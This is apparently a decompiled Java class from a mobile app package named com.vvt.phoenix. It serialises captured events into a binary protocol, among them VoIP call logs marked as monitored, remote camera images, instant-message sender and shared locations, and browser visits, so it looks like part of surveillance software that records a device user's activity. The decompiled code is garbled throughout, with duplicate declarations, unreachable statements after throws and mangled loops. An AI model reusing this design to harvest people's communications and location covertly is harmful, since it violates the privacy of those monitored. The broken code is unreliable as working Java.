package com.vvt.phoenix.prot.a;

import com.vvt.phoenix.prot.event.AppType;
import com.vvt.phoenix.prot.event.ImServiceId;
import com.vvt.phoenix.prot.event.RemoteCameraImageEvent;
import com.vvt.phoenix.prot.event.RemoteCameraImageEvent.CameraType;
import com.vvt.phoenix.prot.event.VoipCallLogEvent;
import com.vvt.phoenix.prot.event.VoipCallLogEvent.IsMonitor;
import com.vvt.phoenix.prot.event.VoipCategory;
import com.vvt.phoenix.prot.event.aa;
import com.vvt.phoenix.prot.event.ab;
import com.vvt.phoenix.prot.event.ac;
import com.vvt.phoenix.prot.event.ad;
import com.vvt.phoenix.prot.event.ae;
import com.vvt.phoenix.prot.event.af;
import com.vvt.phoenix.prot.event.ag;
import com.vvt.phoenix.prot.event.ah;
import com.vvt.phoenix.prot.event.ai;
import com.vvt.phoenix.prot.event.aj;
import com.vvt.phoenix.prot.event.ak;
import com.vvt.phoenix.prot.event.al;
import com.vvt.phoenix.prot.event.am;
import com.vvt.phoenix.prot.event.an;
import com.vvt.phoenix.prot.event.ao;
import com.vvt.phoenix.prot.event.ap;
import com.vvt.phoenix.prot.event.aq;
import com.vvt.phoenix.prot.event.ar;
import com.vvt.phoenix.prot.event.as;
import com.vvt.phoenix.prot.event.at;
import com.vvt.phoenix.prot.event.au;
import com.vvt.phoenix.prot.event.av;
import com.vvt.phoenix.prot.event.aw;
import com.vvt.phoenix.prot.event.e;
import com.vvt.phoenix.prot.event.f;
import com.vvt.phoenix.prot.event.g;
import com.vvt.phoenix.prot.event.h;
import com.vvt.phoenix.prot.event.i;
import com.vvt.phoenix.prot.event.j;
import com.vvt.phoenix.prot.event.k;
import com.vvt.phoenix.prot.event.l;
import com.vvt.phoenix.prot.event.m;
import com.vvt.phoenix.prot.event.n;
import com.vvt.phoenix.prot.event.o;
import com.vvt.phoenix.prot.event.p;
import com.vvt.phoenix.prot.event.q;
import com.vvt.phoenix.prot.event.r;
import com.vvt.phoenix.prot.event.t;
import com.vvt.phoenix.prot.event.u;
import com.vvt.phoenix.prot.event.v;
import com.vvt.phoenix.prot.event.w;
import com.vvt.phoenix.prot.event.x;
import com.vvt.phoenix.prot.event.y;
import com.vvt.phoenix.prot.event.z;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;

public class c
{
  private static final boolean a = com.vvt.phoenix.a.b;
  private static final boolean b = com.vvt.phoenix.a.c;
  private static final boolean c = com.vvt.phoenix.a.d;
  private static final boolean d = com.vvt.phoenix.a.e;
  
  public static com.vvt.phoenix.prot.b.c a(r paramr)
  {
    boolean bool1 = false;
    Object localObject = null;
    if (paramr == null)
    {
      localObject = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject).<init>("Event object is NULL");
      throw ((Throwable)localObject);
    }
    boolean bool2 = a;
    if (bool2) {}
    com.vvt.phoenix.prot.b.c localc = new com/vvt/phoenix/prot/b/c;
    localc.<init>();
    int i = paramr.a();
    byte[] arrayOfByte;
    switch (i)
    {
    default: 
      i = 0;
      arrayOfByte = null;
      localc.a(arrayOfByte);
      localc.a((String)localObject);
      if (localObject != null)
      {
        boolean bool3 = a;
        if (bool3) {}
        localObject = com.vvt.u.a.a((String)localObject);
        bool3 = a;
        if (bool3) {}
        localc.b((byte[])localObject);
      }
      break;
    }
    for (;;)
    {
      return localc;
      localObject = paramr;
      arrayOfByte = a((aw)paramr);
      paramr = (aw)paramr;
      localObject = paramr.c();
      break;
      localObject = paramr;
      arrayOfByte = a((m)paramr);
      paramr = (m)paramr;
      localObject = paramr.c();
      break;
      localObject = paramr;
      arrayOfByte = a((f)paramr);
      paramr = (f)paramr;
      localObject = paramr.c();
      break;
      localObject = paramr;
      arrayOfByte = a((h)paramr);
      paramr = (h)paramr;
      localObject = paramr.c();
      break;
      localObject = paramr;
      arrayOfByte = a((as)paramr);
      paramr = (as)paramr;
      localObject = paramr.c();
      break;
      localObject = paramr;
      arrayOfByte = a((e)paramr);
      paramr = (e)paramr;
      localObject = paramr.c();
      break;
      localObject = paramr;
      arrayOfByte = a((RemoteCameraImageEvent)paramr);
      paramr = (RemoteCameraImageEvent)paramr;
      localObject = paramr.c();
      break;
      bool1 = c;
      if (!bool1) {}
    }
  }
  
  private static void a(VoipCallLogEvent paramVoipCallLogEvent, OutputStream paramOutputStream)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    b(paramVoipCallLogEvent, paramOutputStream);
    int j = (byte)paramVoipCallLogEvent.b().getValue();
    paramOutputStream.write(j);
    j = (byte)paramVoipCallLogEvent.c();
    paramOutputStream.write(j);
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((int)paramVoipCallLogEvent.d());
    paramOutputStream.write(arrayOfByte, 0, i);
    com.vvt.phoenix.a.d.a(paramVoipCallLogEvent.e(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramVoipCallLogEvent.f(), paramOutputStream);
    arrayOfByte = com.vvt.phoenix.a.a.a((int)paramVoipCallLogEvent.g());
    paramOutputStream.write(arrayOfByte, 0, i);
    j = (byte)paramVoipCallLogEvent.h().getValue();
    paramOutputStream.write(j);
    long l = paramVoipCallLogEvent.i();
    arrayOfByte = com.vvt.phoenix.a.a.a((int)l);
    paramOutputStream.write(arrayOfByte, 0, i);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(ab paramab, OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    int i = paramab.h().getServiceId();
    paramOutputStream.write(i);
  }
  
  private static void a(ac paramac, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramac, paramOutputStream);
    int i = paramac.b();
    paramOutputStream.write(i);
    a(paramac, paramOutputStream);
    com.vvt.phoenix.a.d.b(paramac.c(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramac.d(), paramOutputStream);
    Object localObject = paramac.e();
    if (localObject != null)
    {
      a((ae)localObject, paramOutputStream);
      i = paramac.f();
      paramOutputStream.write(i);
      com.vvt.phoenix.a.d.c(paramac.g(), paramOutputStream);
      int j = paramac.i();
      paramOutputStream.write(j);
      i = 0;
      localObject = null;
      while (i < j)
      {
        ad localad = paramac.c(i);
        a(localad, paramOutputStream);
        i += 1;
      }
    }
    localObject = new java/lang/IllegalArgumentException;
    ((IllegalArgumentException)localObject).<init>("Message originator location is null");
    throw ((Throwable)localObject);
    localObject = paramac.l();
    if (localObject != null)
    {
      a((ae)localObject, paramOutputStream);
      boolean bool2 = b;
      if (bool2) {}
      return;
    }
    localObject = new java/lang/IllegalArgumentException;
    ((IllegalArgumentException)localObject).<init>("Share location is null");
    throw ((Throwable)localObject);
  }
  
  private static void a(ad paramad, OutputStream paramOutputStream)
  {
    com.vvt.phoenix.a.d.b(paramad.a(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramad.b(), paramOutputStream);
    a(paramad.c(), paramOutputStream);
    a(paramad.d(), paramOutputStream);
  }
  
  private static void a(ae paramae, OutputStream paramOutputStream)
  {
    int i = 8;
    com.vvt.phoenix.a.d.b(paramae.a(), paramOutputStream);
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a(paramae.c());
    paramOutputStream.write(arrayOfByte, 0, i);
    arrayOfByte = com.vvt.phoenix.a.a.a(paramae.b());
    paramOutputStream.write(arrayOfByte, 0, i);
    arrayOfByte = com.vvt.phoenix.a.a.a(paramae.d());
    paramOutputStream.write(arrayOfByte, 0, 4);
  }
  
  private static void a(af paramaf, OutputStream paramOutputStream)
  {
    int i = 8;
    int j = 4;
    boolean bool1 = a;
    if (bool1) {}
    b(paramaf, paramOutputStream);
    int k = (byte)paramaf.b();
    paramOutputStream.write(k);
    k = (byte)paramaf.c();
    paramOutputStream.write(k);
    k = (byte)paramaf.d();
    paramOutputStream.write(k);
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a(paramaf.f());
    paramOutputStream.write(arrayOfByte, 0, i);
    double d1 = paramaf.e();
    arrayOfByte = com.vvt.phoenix.a.a.a(d1);
    paramOutputStream.write(arrayOfByte, 0, i);
    arrayOfByte = com.vvt.phoenix.a.a.a(paramaf.g());
    paramOutputStream.write(arrayOfByte, 0, j);
    arrayOfByte = com.vvt.phoenix.a.a.a(paramaf.h());
    paramOutputStream.write(arrayOfByte, 0, j);
    arrayOfByte = com.vvt.phoenix.a.a.a(paramaf.i());
    paramOutputStream.write(arrayOfByte, 0, j);
    arrayOfByte = com.vvt.phoenix.a.a.a(paramaf.l());
    paramOutputStream.write(arrayOfByte, 0, j);
    float f = paramaf.m();
    arrayOfByte = com.vvt.phoenix.a.a.a(f);
    paramOutputStream.write(arrayOfByte, 0, j);
    com.vvt.phoenix.a.d.a(paramaf.n(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramaf.o(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramaf.p(), paramOutputStream);
    arrayOfByte = com.vvt.phoenix.a.a.a((int)paramaf.q());
    paramOutputStream.write(arrayOfByte, 0, j);
    com.vvt.phoenix.a.d.a(paramaf.r(), paramOutputStream);
    long l = paramaf.s();
    arrayOfByte = com.vvt.phoenix.a.a.a((int)l);
    paramOutputStream.write(arrayOfByte, 0, j);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(ag paramag, OutputStream paramOutputStream)
  {
    int i = 0;
    boolean bool2 = a;
    if (bool2) {}
    b(paramag, paramOutputStream);
    int j = (byte)paramag.b();
    paramOutputStream.write(j);
    com.vvt.phoenix.a.d.a(paramag.c(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramag.d(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramag.e(), paramOutputStream);
    int k = paramag.i();
    Object localObject = com.vvt.phoenix.a.a.a((short)k);
    int m = 2;
    paramOutputStream.write((byte[])localObject, 0, m);
    j = 0;
    localObject = null;
    while (j < k)
    {
      am localam = paramag.b(j);
      a(localam, paramOutputStream);
      j += 1;
    }
    com.vvt.phoenix.a.d.b(paramag.f(), paramOutputStream);
    localObject = paramag.g();
    com.vvt.phoenix.a.d.b((String)localObject, paramOutputStream);
    j = paramag.h();
    k = (byte)j;
    paramOutputStream.write(k);
    while (i < j)
    {
      com.vvt.phoenix.prot.event.d locald = paramag.c(i);
      a(locald, paramOutputStream);
      i += 1;
    }
    boolean bool1 = b;
    if (bool1) {}
  }
  
  private static void a(ah paramah, OutputStream paramOutputStream)
  {
    int i = 8;
    int j = 4;
    boolean bool1 = a;
    if (bool1) {}
    b(paramah, paramOutputStream);
    Object localObject = com.vvt.phoenix.a.a.a(paramah.d());
    paramOutputStream.write((byte[])localObject, 0, i);
    localObject = com.vvt.phoenix.a.a.a(paramah.e());
    paramOutputStream.write((byte[])localObject, 0, i);
    double d1 = paramah.f();
    float f = (float)d1;
    localObject = com.vvt.phoenix.a.a.a(f);
    paramOutputStream.write((byte[])localObject, 0, j);
    int k = (byte)paramah.g();
    paramOutputStream.write(k);
    com.vvt.phoenix.a.d.a(paramah.h(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramah.i(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramah.l(), paramOutputStream);
    localObject = com.vvt.phoenix.a.a.a(paramah.m());
    paramOutputStream.write((byte[])localObject, 0, j);
    localObject = com.vvt.phoenix.a.a.a(paramah.n());
    paramOutputStream.write((byte[])localObject, 0, j);
    localObject = com.vvt.phoenix.a.a.a(paramah.o());
    paramOutputStream.write((byte[])localObject, 0, j);
    k = (byte)paramah.b();
    paramOutputStream.write(k);
    localObject = paramah.c();
    a((String)localObject, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(ai paramai, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramai, paramOutputStream);
    int i = (byte)paramai.b();
    paramOutputStream.write(i);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(aj paramaj, OutputStream paramOutputStream)
  {
    com.vvt.phoenix.a.d.a(paramaj.a(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramaj.b(), paramOutputStream);
  }
  
  private static void a(ak paramak, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramak, paramOutputStream);
    com.vvt.phoenix.a.d.b(paramak.b(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramak.c(), paramOutputStream);
    int i = paramak.d().getValue();
    paramOutputStream.write(i);
    com.vvt.phoenix.a.d.b(paramak.e(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramak.f(), paramOutputStream);
    String str = paramak.g();
    com.vvt.phoenix.a.d.b(str, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(al paramal, OutputStream paramOutputStream)
  {
    int i = 0;
    String str1 = null;
    boolean bool2 = a;
    if (bool2) {}
    b(paramal, paramOutputStream);
    int j = (byte)paramal.b();
    paramOutputStream.write(j);
    com.vvt.phoenix.a.d.a(paramal.c(), paramOutputStream);
    String str2 = paramal.d();
    com.vvt.phoenix.a.d.a(str2, paramOutputStream);
    j = paramal.g();
    short s = (short)j;
    Object localObject = com.vvt.phoenix.a.a.a(s);
    int k = 2;
    paramOutputStream.write((byte[])localObject, 0, k);
    while (i < j)
    {
      localObject = paramal.a(i);
      a((am)localObject, paramOutputStream);
      i += 1;
    }
    com.vvt.phoenix.a.d.b(paramal.e(), paramOutputStream);
    str1 = paramal.f();
    com.vvt.phoenix.a.d.c(str1, paramOutputStream);
    boolean bool1 = b;
    if (bool1) {}
  }
  
  private static void a(am paramam, OutputStream paramOutputStream)
  {
    int i = (byte)paramam.a();
    paramOutputStream.write(i);
    com.vvt.phoenix.a.d.a(paramam.b(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramam.c(), paramOutputStream);
  }
  
  private static void a(an paraman, OutputStream paramOutputStream)
  {
    int i = 0;
    String str1 = null;
    boolean bool2 = a;
    if (bool2) {}
    b(paraman, paramOutputStream);
    int j = (byte)paraman.b();
    paramOutputStream.write(j);
    com.vvt.phoenix.a.d.a(paraman.c(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paraman.d(), paramOutputStream);
    String str2 = paraman.e();
    com.vvt.phoenix.a.d.a(str2, paramOutputStream);
    j = paraman.g();
    short s = (short)j;
    Object localObject = com.vvt.phoenix.a.a.a(s);
    int k = 2;
    paramOutputStream.write((byte[])localObject, 0, k);
    while (i < j)
    {
      localObject = paraman.b(i);
      a((am)localObject, paramOutputStream);
      i += 1;
    }
    str1 = paraman.f();
    com.vvt.phoenix.a.d.b(str1, paramOutputStream);
    boolean bool1 = b;
    if (bool1) {}
  }
  
  private static void a(ao paramao, OutputStream paramOutputStream)
  {
    int i = 2;
    boolean bool1 = a;
    if (bool1) {}
    b(paramao, paramOutputStream);
    int m = paramao.b();
    int j = (short)m;
    byte[] arrayOfByte1 = com.vvt.phoenix.a.a.a(j);
    paramOutputStream.write(arrayOfByte1, 0, i);
    if (m != 0)
    {
      j = 0;
      arrayOfByte1 = null;
      while (j < m)
      {
        Object localObject = paramao.a(j);
        short s = (short)((ap)localObject).a();
        byte[] arrayOfByte2 = com.vvt.phoenix.a.a.a(s);
        paramOutputStream.write(arrayOfByte2, 0, i);
        localObject = ((ap)localObject).b();
        com.vvt.phoenix.a.d.b((String)localObject, paramOutputStream);
        int k;
        j += 1;
      }
    }
    boolean bool2 = c;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
  }
  
  private static void a(aq paramaq, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramaq, paramOutputStream);
    int i = (byte)paramaq.b();
    paramOutputStream.write(i);
    i = (byte)paramaq.c();
    paramOutputStream.write(i);
    String str = paramaq.d();
    com.vvt.phoenix.a.d.c(str, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(as paramas, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramas, paramOutputStream);
    long l = paramas.a_();
    Object localObject = com.vvt.phoenix.a.a.a((int)l);
    int j = 4;
    paramOutputStream.write((byte[])localObject, 0, j);
    int i = (byte)paramas.b();
    paramOutputStream.write(i);
    com.vvt.phoenix.a.d.a(paramas.d(), paramOutputStream);
    localObject = paramas.c();
    a((String)localObject, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(at paramat, OutputStream paramOutputStream)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    b(paramat, paramOutputStream);
    long l = paramat.b();
    Object localObject = com.vvt.phoenix.a.a.a((int)l);
    paramOutputStream.write((byte[])localObject, 0, i);
    int j = (byte)paramat.c();
    paramOutputStream.write(j);
    localObject = paramat.d();
    a((String)localObject, paramOutputStream);
    int k = paramat.e();
    j = (byte)k;
    paramOutputStream.write(j);
    if (k != 0)
    {
      j = 0;
      localObject = null;
      while (j < k)
      {
        String str = paramat.b(j).a();
        a(str, paramOutputStream);
        j += 1;
      }
    }
    boolean bool2 = c;
    if (bool2) {}
    localObject = com.vvt.phoenix.a.a.a((int)paramat.f());
    paramOutputStream.write((byte[])localObject, 0, i);
    l = paramat.g();
    localObject = com.vvt.phoenix.a.a.a((int)l);
    paramOutputStream.write((byte[])localObject, 0, i);
    localObject = paramat.h();
    com.vvt.phoenix.a.d.b((String)localObject, paramOutputStream);
    bool2 = b;
    if (bool2) {}
  }
  
  private static void a(au paramau, OutputStream paramOutputStream)
  {
    int i = 0;
    String str = null;
    boolean bool2 = a;
    if (bool2) {}
    b(paramau, paramOutputStream);
    int j = (byte)paramau.b().getValue();
    paramOutputStream.write(j);
    j = (byte)paramau.c();
    paramOutputStream.write(j);
    long l = paramau.d();
    Object localObject1 = com.vvt.phoenix.a.a.a((int)l);
    paramOutputStream.write((byte[])localObject1, 0, 4);
    com.vvt.phoenix.a.d.a(paramau.e(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramau.f(), paramOutputStream);
    localObject1 = paramau.g();
    j = (byte)((VoipCallLogEvent.IsMonitor)localObject1).getValue();
    paramOutputStream.write(j);
    j = paramau.h();
    short s = (short)j;
    Object localObject2 = com.vvt.phoenix.a.a.a(s);
    int k = 2;
    paramOutputStream.write((byte[])localObject2, 0, k);
    while (i < j)
    {
      localObject2 = paramau.b(i);
      a((am)localObject2, paramOutputStream);
      i += 1;
    }
    com.vvt.phoenix.a.d.a(paramau.i(), paramOutputStream);
    i = (byte)paramau.l();
    paramOutputStream.write(i);
    str = paramau.m();
    a(str, paramOutputStream);
    boolean bool1 = b;
    if (bool1) {}
  }
  
  private static void a(av paramav, OutputStream paramOutputStream)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    b(paramav, paramOutputStream);
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((int)paramav.b());
    paramOutputStream.write(arrayOfByte, 0, i);
    int j = (byte)paramav.c();
    paramOutputStream.write(j);
    a(paramav.d(), paramOutputStream);
    long l = paramav.e();
    arrayOfByte = com.vvt.phoenix.a.a.a((int)l);
    paramOutputStream.write(arrayOfByte, 0, i);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(aw paramaw, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramaw, paramOutputStream);
    long l = paramaw.a_();
    Object localObject = com.vvt.phoenix.a.a.a((int)l);
    int j = 4;
    paramOutputStream.write((byte[])localObject, 0, j);
    int i = (byte)paramaw.b();
    paramOutputStream.write(i);
    localObject = paramaw.c();
    a((String)localObject, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(com.vvt.phoenix.prot.event.c paramc, OutputStream paramOutputStream)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    b(paramc, paramOutputStream);
    int j = (byte)paramc.b();
    paramOutputStream.write(j);
    j = (byte)paramc.c();
    paramOutputStream.write(j);
    com.vvt.phoenix.a.d.a(paramc.d(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramc.e(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramc.f(), paramOutputStream);
    byte[] arrayOfByte1 = com.vvt.phoenix.a.a.a(paramc.g());
    paramOutputStream.write(arrayOfByte1, 0, i);
    j = paramc.h();
    paramOutputStream.write(j);
    arrayOfByte1 = paramc.i();
    if (arrayOfByte1 != null)
    {
      byte[] arrayOfByte2 = com.vvt.phoenix.a.a.a(arrayOfByte1.length);
      paramOutputStream.write(arrayOfByte2, 0, i);
      int k = arrayOfByte1.length;
      paramOutputStream.write(arrayOfByte1, 0, k);
    }
    for (;;)
    {
      boolean bool2 = a;
      if (bool2) {}
      return;
      arrayOfByte1 = new byte[i];
      byte[] tmp145_143 = arrayOfByte1;
      byte[] tmp146_145 = tmp145_143;
      byte[] tmp146_145 = tmp145_143;
      tmp146_145[0] = 0;
      tmp146_145[1] = 0;
      tmp146_145[2] = 0;
      tmp146_145[3] = 0;
      paramOutputStream.write(arrayOfByte1, 0, i);
    }
  }
  
  private static void a(com.vvt.phoenix.prot.event.d paramd, OutputStream paramOutputStream)
  {
    com.vvt.phoenix.a.d.b(paramd.a(), paramOutputStream);
    a(paramd.b(), paramOutputStream);
  }
  
  private static void a(f paramf, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramf, paramOutputStream);
    long l = paramf.a_();
    Object localObject = com.vvt.phoenix.a.a.a((int)l);
    int j = 4;
    paramOutputStream.write((byte[])localObject, 0, j);
    int i = (byte)paramf.b();
    paramOutputStream.write(i);
    a(paramf.d(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramf.e(), paramOutputStream);
    localObject = paramf.c();
    a((String)localObject, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(g paramg, OutputStream paramOutputStream)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    b(paramg, paramOutputStream);
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((int)paramg.b());
    paramOutputStream.write(arrayOfByte, 0, i);
    int j = (byte)paramg.c();
    paramOutputStream.write(j);
    a(paramg.d(), paramOutputStream);
    a(paramg.e(), paramOutputStream);
    arrayOfByte = com.vvt.phoenix.a.a.a((int)paramg.f());
    paramOutputStream.write(arrayOfByte, 0, i);
    long l = paramg.g();
    arrayOfByte = com.vvt.phoenix.a.a.a((int)l);
    paramOutputStream.write(arrayOfByte, 0, i);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(h paramh, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramh, paramOutputStream);
    long l = paramh.a_();
    Object localObject = com.vvt.phoenix.a.a.a((int)l);
    int j = 4;
    paramOutputStream.write((byte[])localObject, 0, j);
    int i = (byte)paramh.b();
    paramOutputStream.write(i);
    com.vvt.phoenix.a.d.a(paramh.d(), paramOutputStream);
    localObject = paramh.c();
    a((String)localObject, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(i parami, OutputStream paramOutputStream)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    b(parami, paramOutputStream);
    Object localObject = com.vvt.phoenix.a.a.a((int)parami.b());
    paramOutputStream.write((byte[])localObject, 0, i);
    int j = (byte)parami.c();
    paramOutputStream.write(j);
    a(parami.d(), paramOutputStream);
    localObject = com.vvt.phoenix.a.a.a((int)parami.e());
    paramOutputStream.write((byte[])localObject, 0, i);
    long l = parami.f();
    localObject = com.vvt.phoenix.a.a.a((int)l);
    paramOutputStream.write((byte[])localObject, 0, i);
    localObject = parami.g();
    com.vvt.phoenix.a.d.b((String)localObject, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(j paramj, OutputStream paramOutputStream)
  {
    com.vvt.phoenix.a.d.b(paramj.b(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramj.c(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramj.d(), paramOutputStream);
    com.vvt.phoenix.a.d.b(paramj.e(), paramOutputStream);
  }
  
  private static void a(k paramk, OutputStream paramOutputStream)
  {
    int i = 252;
    boolean bool1 = a;
    if (bool1) {}
    b(paramk, paramOutputStream);
    Object localObject = paramk.b();
    byte[] arrayOfByte1;
    int i3;
    if (localObject != null)
    {
      arrayOfByte1 = com.vvt.phoenix.a.a.a((String)localObject);
      int j = arrayOfByte1.length;
      i3 = 255;
      if (j > i3)
      {
        int k = c;
        if (k != 0) {}
        k = c;
        if (k != 0) {}
        byte[] arrayOfByte2 = new byte[i];
        k = 0;
        localObject = null;
        while (k < i)
        {
          int i4 = arrayOfByte1[k];
          arrayOfByte2[k] = i4;
          int m;
          k += 1;
        }
        boolean bool2 = c;
        if (bool2) {}
        bool2 = c;
        if (bool2) {}
        int n = arrayOfByte2.length;
        int i5 = (byte)n;
        paramOutputStream.write(i5);
        paramOutputStream.write(arrayOfByte2, 0, n);
        com.vvt.phoenix.a.d.b(paramk.c(), paramOutputStream);
        localObject = paramk.d();
        if (localObject == null) {
          break label286;
        }
        i5 = ((String)localObject).length();
        i3 = 19;
        if (i5 != i3) {
          break label262;
        }
        localObject = com.vvt.phoenix.a.a.a((String)localObject);
        i5 = localObject.length;
        paramOutputStream.write((byte[])localObject, 0, i5);
        int i1 = paramk.e();
        if (i1 == 0) {
          break label310;
        }
        i1 = 1;
        paramOutputStream.write(i1);
      }
    }
    for (;;)
    {
      localObject = paramk.f();
      com.vvt.phoenix.a.d.a((String)localObject, paramOutputStream);
      int i2 = a;
      if (i2 != 0) {}
      return;
      i3 = (byte)i2;
      paramOutputStream.write(i3);
      paramOutputStream.write(arrayOfByte1, 0, i2);
      break;
      paramOutputStream.write(0);
      break;
      label262:
      boolean bool3 = d;
      if (bool3) {}
      localObject = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject).<init>("Visit time length is invalid: 19 String length is expected.");
      throw ((Throwable)localObject);
      label286:
      bool3 = d;
      if (bool3) {}
      localObject = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject).<init>("Visit time is empty");
      throw ((Throwable)localObject);
      label310:
      paramOutputStream.write(0);
    }
  }
  
  private static void a(l paraml, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paraml, paramOutputStream);
    int i = (byte)paraml.b();
    paramOutputStream.write(i);
    long l = paraml.c();
    Object localObject = com.vvt.phoenix.a.a.a((int)l);
    int j = 4;
    paramOutputStream.write((byte[])localObject, 0, j);
    com.vvt.phoenix.a.d.a(paraml.d(), paramOutputStream);
    localObject = paraml.e();
    com.vvt.phoenix.a.d.a((String)localObject, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(m paramm, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramm, paramOutputStream);
    long l = paramm.a_();
    Object localObject = com.vvt.phoenix.a.a.a((int)l);
    int j = 4;
    paramOutputStream.write((byte[])localObject, 0, j);
    int i = (byte)paramm.b();
    paramOutputStream.write(i);
    a(paramm.d(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramm.e(), paramOutputStream);
    localObject = paramm.c();
    a((String)localObject, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(n paramn, OutputStream paramOutputStream)
  {
    int i = 4;
    boolean bool1 = a;
    if (bool1) {}
    b(paramn, paramOutputStream);
    Object localObject = com.vvt.phoenix.a.a.a((int)paramn.b());
    paramOutputStream.write((byte[])localObject, 0, i);
    int j = (byte)paramn.c();
    paramOutputStream.write(j);
    a(paramn.d(), paramOutputStream);
    a(paramn.e(), paramOutputStream);
    long l = paramn.f();
    localObject = com.vvt.phoenix.a.a.a((int)l);
    paramOutputStream.write((byte[])localObject, 0, i);
    localObject = paramn.g();
    com.vvt.phoenix.a.d.b((String)localObject, paramOutputStream);
    boolean bool2 = b;
    if (bool2) {}
  }
  
  private static void a(o paramo, OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    b(paramo, paramOutputStream);
    int i = paramo.f();
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((short)i);
    int j = 2;
    paramOutputStream.write(arrayOfByte, 0, j);
    int k = (byte)paramo.g();
    paramOutputStream.write(k);
    switch (i)
    {
    }
    for (;;)
    {
      boolean bool2 = b;
      if (bool2) {}
      return;
      paramo = (v)paramo;
      a(paramo, paramOutputStream);
      continue;
      paramo = (u)paramo;
      a(paramo, paramOutputStream);
    }
  }
  
  private static void a(p paramp, OutputStream paramOutputStream)
  {
    int i = 0;
    String str = null;
    boolean bool2 = a;
    if (bool2) {}
    b(paramp, paramOutputStream);
    int j = (byte)paramp.b();
    paramOutputStream.write(j);
    com.vvt.phoenix.a.d.a(paramp.c(), paramOutputStream);
    com.vvt.phoenix.a.d.a(paramp.d(), paramOutputStream);
    int k = paramp.h();
    Object localObject = com.vvt.phoenix.a.a.a((short)k);
    int m = 2;
    paramOutputStream.write((byte[])localObject, 0, m);
    j = 0;
    localObject = null;
    while (j < k)
    {
      am localam = paramp.b(j);
      a(localam, paramOutputStream);
      j += 1;
    }
    localObject = paramp.e();
    com.vvt.phoenix.a.d.b((String)localObject, paramOutputStream);
    j = paramp.g();
    k = (byte)j;
    paramOutputStream.write(k);
    while (i < j)
    {
      com.vvt.phoenix.prot.event.d locald = paramp.c(i);
      a(locald, paramOutputStream);
      i += 1;
    }
    str = paramp.f();
    com.vvt.phoenix.a.d.c(str, paramOutputStream);
    boolean bool1 = b;
    if (bool1) {}
  }
  
  private static void a(q paramq, OutputStream paramOutputStream)
  {
    byte[] arrayOfByte = a(paramq);
    int i = arrayOfByte.length;
    paramOutputStream.write(arrayOfByte, 0, i);
  }
  
  public static void a(r paramr, OutputStream paramOutputStream)
  {
